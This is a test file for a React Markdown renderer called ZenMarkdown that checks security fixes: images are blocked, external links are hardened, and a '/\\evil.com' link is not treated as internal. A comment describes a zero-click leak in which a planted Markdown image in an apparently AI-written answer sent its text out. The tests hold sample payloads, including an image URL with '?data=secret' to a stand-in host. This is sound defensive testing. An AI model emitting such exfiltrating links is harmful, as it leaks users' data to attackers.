import { render } from '@testing-library/react';
import { describe, it, expect, vi } from 'vitest';
import { ZenMarkdown } from './ZenMarkdown';

vi.mock('next/link', () => ({
  default: ({ href, children }: { href: string; children: React.ReactNode }) => <a data-internal href={href}>{children}</a>,
}));

/**
 * Security fixes plan, H7: a Markdown image in a Zen answer was fetched on
 * sight — the answer's text sent to whoever planted it, with no click.
 */
describe('ZenMarkdown', () => {
  it('never renders an image', () => {
    const { container } = render(<ZenMarkdown text={'Here: ![leak](https://example.invalid/p.png?data=secret)'} />);
    expect(container.querySelector('img')).toBeNull();
    expect(container.textContent).toContain('[image not shown: leak]');
  });

  it('skips raw HTML images too', () => {
    const { container } = render(<ZenMarkdown text={'<img src="https://example.invalid/x.png">'} />);
    expect(container.querySelector('img')).toBeNull();
  });

  it('shows where an external link goes, and opens it apart', () => {
    const { container } = render(<ZenMarkdown text={'See [the report](https://www.example.com/r).'} />);
    const a = container.querySelector('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toContain('noopener');
    expect(a.getAttribute('rel')).toContain('noreferrer');
    expect(a.textContent).toContain('example.com');
  });

  it('does not treat /\\evil.com as a page of the app', () => {
    const { container } = render(<ZenMarkdown text={'[Acme](/\\evil.com/x)'} />);
    // Markdown hands it over as /%5Cevil.com/x: not a link at all, just its text.
    expect(container.querySelector('a[data-internal]')).toBeNull();
    expect(container.textContent).toContain('Acme');
  });

  it('keeps an internal link in the app', () => {
    const { container } = render(<ZenMarkdown text={'[Acme](/companies/abc)'} />);
    expect(container.querySelector('a')!.hasAttribute('data-internal')).toBe(true);
  });
});
